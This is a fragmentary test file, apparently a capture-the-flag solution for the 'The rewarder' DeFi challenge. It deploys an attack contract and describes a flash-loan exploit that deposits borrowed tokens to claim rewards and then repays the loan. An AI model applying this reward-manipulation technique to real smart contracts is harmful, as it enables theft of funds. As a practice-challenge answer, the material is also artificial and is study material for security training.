...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        ...
        // First wait for 5 days for the start of new round
        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

        /**Deploy the attack contract. This contract executes a flashloan for all the DVT tokens
            held by the flashloan contract. The flashloan function calls the fallback function in
            our contract, where we deposit the tokens, withdraw with all the rewards and then return 
            the flashloan amount. 
         * */ 
        const RewardAttack = await ethers.getContractFactory('RewardAttack', attacker);

        this.rewardattack = await RewardAttack.deploy(
        ...
        await this.rewardattack.attack()
    });
